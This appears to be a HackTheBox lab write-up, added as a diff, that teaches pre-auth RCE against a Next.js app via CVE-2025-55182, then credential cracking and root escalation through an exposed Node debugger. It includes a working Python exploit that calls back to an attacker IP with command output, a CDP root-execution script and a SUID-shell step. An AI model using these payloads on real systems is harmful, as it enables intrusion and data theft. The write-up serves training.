@@ -1,0 +1,698 @@
+HackTheBox — Reactor | Writeup
+================================
+
+Overview
+--------
+Machine   : Reactor
+OS        : Linux (Ubuntu)
+Difficulty: Medium/Hard
+CVE       : CVE-2025-55182 (React2Shell)
+Technique : Pre-auth RCE via RSC Flight protocol deserialization
+
+
+Phase 1: Reconnaissance
+------------------------
+
+Reconnaissance means "looking around before attacking". Just like a burglar
+would walk past a house first to see how many doors and windows it has,
+we need to find out what services are running on the target machine before
+we can attack anything.
+
+
+Step 1 — Connectivity Check
+
+  ping -c 2 10.129.4.110
+
+  What is ping?
+    Ping sends a small "are you there?" message to the target and waits for
+    a reply. If it replies, the machine is online and reachable.
+    -c 2 means send exactly 2 pings then stop.
+
+  What is TTL?
+    TTL (Time To Live) is a number in the reply that tells you how many
+    network hops the packet has left. Different operating systems start
+    with different TTL values:
+      Linux starts at 64  → we receive ~63 (lost 1 hop getting to us)
+      Windows starts at 128 → we receive ~127
+
+    We got TTL=63 → the target is Linux.
+    This matters because Linux and Windows have different commands,
+    file paths, and privilege escalation techniques.
+
+
+Step 2 — Port Scanning with Nmap
+
+  What is a port?
+    Think of a server like an office building. The IP address is the
+    building's street address. Ports are the individual offices inside.
+    Each service runs on a specific port number:
+      Port 22  = SSH (remote terminal login)
+      Port 80  = HTTP (normal websites)
+      Port 443 = HTTPS (secure websites)
+      Port 3000 = common for development web servers
+
+    A port can be:
+      open     = a service is running there and accepting connections
+      closed   = nothing is running there
+      filtered = a firewall is silently blocking our scan packets
+
+  What is Nmap?
+    Nmap is a port scanner. It sends packets to every port and analyses
+    the responses to figure out which ones are open and what's running.
+
+  Command:
+    nmap -sC -sV -p- --min-rate 5000 -oA nmap/full 10.129.4.110
+
+  Breaking down each flag:
+    -p-          Scan ALL 65535 ports.
+                 By default nmap only checks the top 1000 most common ports.
+                 Machines on HTB often hide services on unusual ports on
+                 purpose. Always use -p- to avoid missing things.
+
+    -sV          Version detection. Instead of just saying "port 22 is open",
+                 nmap tries to figure out WHAT is running there and what
+                 version it is (e.g. "OpenSSH 9.6p1"). Version numbers matter
+                 because old versions often have known vulnerabilities.
+
+    -sC          Run default scripts. Nmap has built-in mini-programs called
+                 scripts that do extra checks — grabbing banners, checking
+                 for common misconfigs, etc.
+
+    --min-rate 5000
+                 Send at least 5000 packets per second. Makes the scan faster.
+                 Fine for CTF, but noisy on real networks (IDS will flag it).
+
+    -oA nmap/full
+                 Save results in ALL formats (text, xml, grepable) into a
+                 file called "full" in the nmap/ folder. Always save your
+                 scan results — you'll want to look back at them.
+
+  Results:
+    PORT     STATE    SERVICE  VERSION
+    22/tcp   open     ssh      OpenSSH 9.6p1 Ubuntu
+    3000/tcp open     http     Next.js
+    1345/tcp filtered
+    25604/tcp filtered
+    ...
+
+  What this tells us:
+    - Port 22 (SSH): We could log in here IF we find credentials. Not useful yet.
+    - Port 3000 (web app): This is our main target. A web application is
+      running here — web apps have login forms, user input, APIs, all of
+      which can have vulnerabilities.
+    - Filtered ports: A firewall is blocking these from the outside. They
+      might be accessible internally (from inside the machine). Worth
+      remembering for later.
+
+
+Step 3 — Web Enumeration
+
+  What is enumeration?
+    Enumeration means methodically collecting information. For a website,
+    this means: what framework is it built with? What pages exist? What
+    does the source code reveal?
+
+  Visit the website:
+    http://10.129.4.110:3000
+
+  We see: "ReactorWatch — Core Monitoring System v3.2.1"
+  A fake nuclear reactor dashboard. The version number (v3.2.1) is a clue
+  — search for known vulnerabilities in this specific version.
+
+  Checking HTTP response headers:
+    curl -sI http://10.129.4.110:3000/
+
+    Headers are metadata the server sends with every response. They often
+    reveal what technology is running:
+      X-Powered-By: Next.js   ← tells us the framework
+
+  What is Next.js?
+    Next.js is a popular JavaScript framework for building websites.
+    It runs JavaScript on the SERVER (not just in your browser).
+    The newer version uses something called "App Router" with
+    "React Server Components" — this is important for the exploit.
+
+  How to confirm it's Next.js App Router (not the older Pages Router):
+    Look at the HTML source — you'll see lines like:
+      self.__next_f.push(...)
+    This is the RSC Flight protocol payload, unique to App Router.
+    The build ID also appears: "b":"L3bimJe_3LvBcFWAnK5L4"
+
+  Why does the framework matter?
+    Every framework has its own vulnerabilities. Knowing it's Next.js App
+    Router narrows our search enormously. We can look up "Next.js App Router
+    vulnerabilities 2025" and find CVE-2025-55182 immediately.
+
+
+Phase 2: Vulnerability Identification
+--------------------------------------
+
+Step 1 — Finding the CVE
+
+  CVE stands for Common Vulnerabilities and Exposures. It's a public database
+  of known security flaws. Every CVE has a number (like CVE-2025-55182) and
+  a description of what's broken and how serious it is.
+
+  CVSS score is a severity rating from 0 to 10:
+    0-3  = Low
+    4-6  = Medium
+    7-8  = High
+    9-10 = Critical
+  CVE-2025-55182 scored 10.0 — the maximum possible.
+
+  CVE-2025-55182 — "React2Shell"
+
+  What software is affected?
+    React 19.0.0 to 19.2.0 and Next.js 15.x / 16.x using App Router.
+    Our target matches this exactly.
+
+  What kind of vulnerability is it?
+    RCE = Remote Code Execution.
+    This means an attacker can run ANY command on the server without
+    needing a username or password (pre-authentication).
+    RCE is the most dangerous type of vulnerability — it gives complete
+    control of the machine.
+
+  What is the root cause?
+    To understand the bug, we need to understand a few concepts:
+
+    What is React Server Components (RSC)?
+      Normally, a website's JavaScript runs in your browser. RSC is a newer
+      idea where some JavaScript runs on the SERVER before the page is sent
+      to you. The server sends the result (not the code) to the browser.
+
+    What is the Flight protocol?
+      When the server sends RSC data to the browser, it uses a special format
+      called the Flight protocol. It encodes JavaScript objects as text using
+      special $ prefixed references like "$1:something" to point to other pieces
+      of data.
+
+    What is deserialization?
+      Serialization = converting an object into text so it can be sent over
+      a network. Deserialization = converting it back into an object.
+      Insecure deserialization = the code trusts the incoming data too much
+      and an attacker can craft malicious data that, when converted back into
+      an object, does something dangerous.
+
+    The actual bug:
+      The React Flight protocol lets you reference things like:
+        "$1:constructor:constructor"
+      This means: "take object 1, access its constructor, then access
+      THAT object's constructor."
+
+      In JavaScript, every object's constructor is Object.
+      Object's constructor is Function — the thing that creates new functions.
+
+      So "$1:constructor:constructor" secretly gives you access to the
+      Function() constructor — which can turn any string of text into
+      executable JavaScript code.
+
+      React never validated that you were allowed to do this, so an attacker
+      can abuse it to run any JavaScript they want on the server.
+
+
+Step 2 — Confirming the Target is Vulnerable
+
+  Before launching a full exploit, always verify the target is actually
+  vulnerable. Exploits can be noisy and crash things.
+
+  Detection method:
+    A vulnerable server will HANG (freeze and never respond) when sent
+    this specific malformed request:
+
+    timeout 8 curl -X POST http://10.129.4.110:3000/ \
+      -H "Next-Action: test" \
+      -H "Accept: text/x-component" \
+      -F '0=["$1:a:a"]' \
+      -F '1={}'
+
+  Breaking this down:
+    curl         = command line tool for making HTTP requests
+    -X POST      = send a POST request (submitting data, not just loading a page)
+    -H           = add a custom header
+    Next-Action  = a Next.js header that triggers server action processing
+    Accept: text/x-component = tells Next.js to respond in RSC Flight format
+    -F           = send form data fields
+    timeout 8    = if no response in 8 seconds, give up and report failure
+
+  Why does a vulnerable server hang?
+    The payload ["$1:a:a"] creates a circular reference that React tries
+    to resolve forever — like an infinite loop. A patched server detects
+    this and rejects it immediately. A vulnerable one spins forever.
+
+  Result: Our target timed out → VULNERABLE confirmed.
+
+
+Phase 3: Exploitation
+----------------------
+
+This section explains HOW the exploit works, step by step.
+
+  The big picture:
+    We're going to send a carefully crafted HTTP request to the web server.
+    Inside the request is fake React Flight data that tricks the server into
+    running our JavaScript code. Since the code runs on the server (as the
+    user running the web app), we get to execute commands on the machine.
+
+
+Step 1 — Understanding the Exploit Request
+
+  We send a POST request with these headers:
+
+    Next-Action: x
+      This header tells Next.js "I'm calling a server action".
+      Server actions are functions that run on the server when triggered
+      from the browser (like submitting a form). This header activates the
+      vulnerable code path. The value "x" doesn't need to be valid —
+      the vulnerability triggers before Next.js checks if the action exists.
+
+    Accept: text/x-component
+      Tells the server to respond in RSC Flight format instead of HTML.
+      Without this, the server just returns a normal webpage.
+
+    Content-Type: multipart/form-data
+      Tells the server the body contains form fields (like a file upload form).
+      The RSC deserialization reads these fields, which is where our
+      malicious payload lives.
+
+
+Step 2 — Understanding the Payload
+
+  We send two form fields (name="0" and name="1").
+
+  Field 1 (name="1") is simple:
+    "$@0"
+    The $@ prefix means "this is a thenable reference to field 0".
+    A thenable is anything that behaves like a Promise (JavaScript's way
+    of handling async operations). This makes React try to "resolve"
+    field 0 as if it were an asynchronous operation — which triggers
+    the vulnerable deserialization code.
+
+  Field 0 (name="0") is the main payload:
+    {
+      "then": "$1:__proto__:then",
+      "status": "resolved_model",
+      "reason": -1,
+      "value": "{\"then\":\"$B1337\"}",
+      "_response": {
+        "_prefix": "OUR JAVASCRIPT CODE HERE",
+        "_formData": {"get": "$1:constructor:constructor"}
+      }
+    }
+
+  What each part does — in plain English:
+
+    "status": "resolved_model"
+      Tricks React into thinking this data chunk has already been processed
+      and is ready to use. Normally React would validate it first.
+      Skipping validation is what makes the exploit work.
+
+    "then": "$1:__proto__:then"
+      "$1" = look at field 1 (our "$@0" self-reference)
+      "__proto__" = access the hidden parent object (prototype chain)
+      "then" = access the "then" method on that parent
+      In JavaScript, every object inherits from Object, and Promises have
+      a "then" method. This line makes React think our fake chunk is a
+      Promise and tries to resolve it.
+
+    "_formData": {"get": "$1:constructor:constructor"}
+      This is the heart of the exploit.
+      "$1:constructor:constructor" navigates the prototype chain:
+        Field 1 → .constructor = Object (the base JS object type)
+        Object   → .constructor = Function (the JS function creator)
+      So now "_formData.get" secretly points to the Function() constructor.
+      When React calls formData.get() later, it's actually calling Function().
+
+    "_prefix": "OUR JAVASCRIPT CODE"
+      This string gets passed into Function() as the code to execute.
+      Function("code here") creates a new JavaScript function with that body.
+      When React calls it, our code runs on the server as the web app user.
+
+
+Step 3 — The Exploit Script (exploit.py)
+
+  We write a Python script to automate sending this payload:
+
+    import requests, json, sys
+
+    TARGET   = "http://10.129.4.110:3000"   # the target machine
+    ATTACKER = "10.10.16.192"               # our HTB VPN IP
+    PORT     = 8080                         # our HTTP server port
+
+    def exploit(cmd):
+        boundary = "----WebKitFormBoundaryReactor"
+        # boundary = a random string that separates form fields in the body
+
+        # This is the JavaScript that will run on the server:
+        js_code = (
+            "var cp=process.mainModule.require('child_process');"
+            # Load Node.js's child_process module (lets you run shell commands)
+
+            f"var out=cp.execSync('{cmd}').toString().trim();"
+            # Run our shell command and capture its output as a string
+
+            "var http=process.mainModule.require('http');"
+            # Load Node.js's http module (lets you make web requests)
+
+            f"var opts={{hostname:'{ATTACKER}',port:{PORT},"
+            f"path:'/out?c='+encodeURIComponent(out),method:'GET'}};"
+            # Build a GET request to OUR machine with the command output in the URL
+
+            "http.request(opts).end();"
+            # Send the request — this delivers the output back to us
+        )
+
+        # Build the RSC Flight payload (field 0):
+        part0 = json.dumps({
+            "then": "$1:__proto__:then",
+            "status": "resolved_model",
+            "reason": -1,
+            "value": '{"then":"$B1337"}',
+            "_response": {
+                "_prefix": js_code,        # our JS goes here
+                "_formData": {"get": "$1:constructor:constructor"}
+            }
+        })
+
+        # Build the multipart body with both fields:
+        body = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="0"\r\n\r\n'
+            f"{part0}\r\n"               # field 0: the exploit payload
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="1"\r\n\r\n'
+            f'"$@0"\r\n'                 # field 1: the self-reference trigger
+            f"--{boundary}--\r\n"
+        )
+
+        headers = {
+            "Next-Action": "x",
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+            "Accept": "text/x-component",
+        }
+
+        r = requests.post(TARGET + "/", headers=headers,
+                          data=body.encode(), timeout=15)
+
+
+Step 4 — Out-of-Band (OOB) Exfiltration
+
+  Why can't we just read the output from the response?
+    The server always returns HTTP 500 (error) after our code runs.
+    The error response contains a hashed digest, not our command output:
+      1:E{"digest":"1228136346"}
+    Our code runs BEFORE the error is generated, but the output is
+    never included in the error message. So we need another way to get it.
+
+  What is OOB (Out-of-Band) exfiltration?
+    Out-of-band means "using a different channel".
+    Instead of reading output from the exploit response (same channel),
+    we make the TARGET machine connect back to US on a separate connection.
+    We put the output in that callback request's URL.
+
+  How to set it up:
+
+    On our machine, start a simple web server to catch callbacks:
+      python3 -m http.server 8080
+
+    This starts a web server that logs every request it receives.
+
+    When our JavaScript runs on the target:
+      cp.execSync('id')  → runs the "id" command → returns "uid=999(node)..."
+      http.request() sends GET http://10.10.16.192:8080/out?c=uid%3D999(node)
+
+    We see this in our HTTP server log:
+      10.129.4.110 GET /out?c=uid%3D999(node)%20gid%3D988(node) 404
+
+    The output is URL-encoded in the ?c= parameter. %3D = "=" and %20 = " ".
+    Decode it:
+      python3 -c "import urllib.parse; print(urllib.parse.unquote('uid%3D999(node)%20gid%3D988(node)'))"
+      → uid=999(node) gid=988(node)
+
+  RCE CONFIRMED — we are running commands on the server as the "node" user.
+
+  Why "node" user?
+    The web application is running as a low-privilege user called "node".
+    This is good security practice — if the app gets hacked, the attacker
+    doesn't immediately get root. We need to escalate privileges separately.
+
+
+Phase 4: Post-Exploitation Enumeration
+----------------------------------------
+
+System Users:
+  ls /home  →  engineer, node
+  /home/engineer/ = Permission denied for node user
+  → user flag is in /home/engineer/, need to escalate
+
+Environment Variables (from printenv):
+  DB_PATH=/opt/reactor-app/reactor.db        ← SQLite database
+  DB_TYPE=sqlite3
+  SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+  PWD=/opt/reactor-app
+  ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+  NODE_ENV=production
+
+Database:
+  sqlite3 /opt/reactor-app/reactor.db .tables
+  → sensor_logs  users
+
+  The users table likely contains hashed credentials for engineer.
+
+
+Phase 5: Privilege Escalation — node → engineer
+-------------------------------------------------
+
+Step 1 — Dump the SQLite database
+
+  We found DB_PATH=/opt/reactor-app/reactor.db in the environment variables.
+  Using our RCE as the node user, we queried it with Node.js directly
+  (avoiding shell quoting issues with sqlite3 CLI):
+
+    var Database = process.mainModule.require('/opt/reactor-app/node_modules/better-sqlite3');
+    var db = new Database('/opt/reactor-app/reactor.db', {readonly: true});
+    var rows = db.prepare('SELECT * FROM users').all();
+
+  Result — users table:
+    id | username  | password_hash                    | role
+    ---+-----------+----------------------------------+---------------
+    1  | engineer  | 39d97110eafe2a9a68639812cd271e8e | operator
+    2  | admin     | a203b22191d744a4e70ada5c101b17b8 | administrator
+
+  What is a password hash?
+    Websites don't store your actual password — they store a scrambled version
+    called a hash. When you log in, it hashes what you typed and compares it.
+    The goal here is to reverse the hash back to the original password.
+
+  How to identify the hash type?
+    MD5 hashes are always exactly 32 characters of hex (0-9, a-f).
+    Both hashes here are 32 chars → MD5.
+    MD5 is a very weak and old algorithm — it cracks fast.
+
+Step 2 — Crack the MD5 hash
+
+  Save the engineer hash to a file:
+    echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt
+
+  Run hashcat (a password cracking tool) against it:
+    hashcat -m 0 hashes.txt /home/mari/rockyou.txt
+
+  What is hashcat doing?
+    It takes every word from rockyou.txt (a list of 14 million real passwords
+    people have used), hashes each one with MD5, and checks if it matches.
+    This is called a dictionary attack.
+
+  What is rockyou.txt?
+    A famous wordlist from a 2009 data breach where 14 million real passwords
+    were leaked in plain text. It's the first wordlist you always try.
+
+  Flag -m 0 means MD5 mode. Other common modes:
+    -m 1000  = NTLM (Windows)
+    -m 1800  = sha512crypt (Linux /etc/shadow)
+    -m 3200  = bcrypt
+
+  Result:
+    39d97110eafe2a9a68639812cd271e8e:reactor1
+
+  engineer's password is: reactor1
+
+Step 3 — SSH as engineer and get user flag
+
+  ssh engineer@10.129.4.110
+  password: reactor1
+
+  cat ~/user.txt
+  → 60ac6b1d081b148f799275b28fbdd278
+
+  USER FLAG: 60ac6b1d081b148f799275b28fbdd278
+
+
+Phase 6: Privilege Escalation — engineer → root
+-------------------------------------------------
+
+Step 1 — Enumerate as engineer
+
+  Standard privesc checklist (run these on every box):
+
+    sudo -l                          # what can I run as root?
+    find / -perm -4000 2>/dev/null   # SUID binaries (run as owner, not you)
+    getcap -r / 2>/dev/null          # special capabilities on binaries
+    crontab -l; cat /etc/crontab     # scheduled jobs running as root
+    ps aux | grep root               # processes currently running as root
+
+  Nothing unusual in SUID or capabilities. No custom cron jobs.
+
+Step 2 — Spot the vulnerable process
+
+  ps aux shows:
+    root  1417  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+
+  Breaking this down:
+    /usr/bin/node          = Node.js (JavaScript runtime)
+    --inspect=127.0.0.1:9229  = THE IMPORTANT PART (explained below)
+    /opt/uptime-monitor/worker.js  = the script it's running
+    running as root        = anything we do here runs as root
+
+  What is --inspect?
+    When you add --inspect to a Node.js program, it opens a debugger.
+    A debugger is a tool developers use to step through code and find bugs.
+    The debugger listens on port 9229 and lets anyone who connects to it
+    READ and EXECUTE JavaScript inside the running program.
+
+    Normally this is fine during development — it only binds to 127.0.0.1
+    (localhost), meaning only people ON the machine can reach it.
+
+    The problem: we ARE on the machine as engineer.
+    So we can connect to root's debugger and tell it to run our commands.
+
+    Think of it like this: root left the keys in the car, engine running,
+    and we can reach through the window and steer.
+
+Step 3 — SSH port forward
+
+  Port 9229 is only accessible from inside the machine (127.0.0.1).
+  We need to tunnel it to our attacker machine so we can talk to it.
+
+  From our attacker machine:
+    ssh -L 9229:127.0.0.1:9229 engineer@10.129.4.110
+
+  What does -L do?
+    -L 9229:127.0.0.1:9229 means:
+      "Forward MY local port 9229 → through the SSH tunnel → to the
+       target's localhost port 9229"
+
+    Now when we connect to localhost:9229 on our machine, it secretly
+    goes through the SSH connection and arrives at root's debugger.
+
+Step 4 — Get the WebSocket URL
+
+  The Node.js debugger uses WebSocket (a type of persistent connection).
+  First, ask it for its URL:
+
+    curl http://localhost:9229/json
+
+  Returns something like:
+    {"webSocketDebuggerUrl": "ws://127.0.0.1:9229/6e1e97a2-2556-4358-8a42-16b2c45ca59e"}
+
+  That long UUID at the end is a random session ID the debugger generates.
+
+Step 5 — Execute code as root (privEsc.py)
+
+  We write a small Python script that:
+    1. Connects to the debugger WebSocket
+    2. Sends a "Runtime.evaluate" message (the CDP command to run JS)
+    3. The JS executes inside root's Node.js process → runs as root
+
+  Script (privEsc.py):
+
+    import websocket, json, sys
+
+    ws_url = sys.argv[1]
+    ws = websocket.create_connection(ws_url)
+
+    payload = {
+        "id": 1,
+        "method": "Runtime.evaluate",
+        "params": {
+            "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"
+        }
+    }
+
+    ws.send(json.dumps(payload))
+    print(ws.recv())
+    ws.close()
+
+  What is Runtime.evaluate?
+    It's a command in the Chrome DevTools Protocol (CDP) — the same protocol
+    Chrome uses when you open DevTools and type in the console.
+    "Runtime.evaluate" means "run this JavaScript right now".
+
+  Why process.mainModule.require instead of require?
+    In some Node.js environments, require is not available as a global.
+    process.mainModule.require always works — it accesses require through
+    the main module's reference.
+
+  Run it:
+    python3 privEsc.py "ws://127.0.0.1:9229/6e1e97a2-2556-4358-8a42-16b2c45ca59e"
+
+  Response:
+    {"id":1,"result":{"result":{"type":"string","value":"04ed85a5fd7e67df706b08aeee18a38d\n"}}}
+
+  The "value" field contains the output of our command — the root flag!
+
+  ROOT FLAG: 04ed85a5fd7e67df706b08aeee18a38d
+
+  To get a full root shell instead, change the expression to:
+    cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+
+  Then on the target run:
+    /tmp/rootbash -p    # -p = preserve owner (root), gives you a root shell
+
+
+Key Lessons
+------------
+
+Methodology:
+  - Always scan ALL ports (-p-), not just the default top 1000
+  - Check HTTP headers immediately — X-Powered-By reveals frameworks
+  - Check JS source files for API routes, action IDs, and app logic
+  - Environment variables are often the richest source of creds and paths
+  - Always run: sudo -l, ps aux, getcap, find SUID after getting a shell
+
+CVE-2025-55182 Specifics:
+  - Works against ANY Next.js App Router endpoint — no valid action ID needed
+  - Detection: POST with Next-Action header → server hangs = vulnerable
+  - _prefix field in RSC payload is where your JavaScript executes
+  - Response is always 500 — output comes via OOB, not the response body
+  - Use Node.js built-in http module for callbacks, not curl
+
+OOB Exfiltration:
+  When you have blind RCE (no output in response body):
+    1. Start python3 -m http.server 8080
+    2. Make target call back to your server with output in URL query string
+    3. URL-decode the captured data:
+       python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"
+
+  Why use OOB instead of reading the response directly?
+    In blind RCE, the server runs your code but never sends the output back
+    to you in the HTTP response. So you make the SERVER reach out to YOU
+    with the data. This is called "out-of-band" because the data comes back
+    on a different channel (your HTTP server) than the exploit request.
+
+Node.js --inspect Privesc:
+  Anytime you see a process running as a privileged user with --inspect,
+  it is exploitable if you can reach port 9229.
+  The steps are always:
+    1. SSH port forward to reach the debugger
+    2. curl localhost:9229/json to get the WebSocket URL
+    3. Send Runtime.evaluate via WebSocket to execute JS as that user
+  This is a real-world misconfiguration — developers sometimes leave
+  --inspect on in production by accident.
+
+
+References
+-----------
+  https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+  https://www.ox.security/blog/reacts-cve-2025-55182-is-now-actively-exploitable-verified-poc/
+  https://blog.intelligencex.org/cve-2025-55182-react2shell-rce-exploit-poc
+  https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/
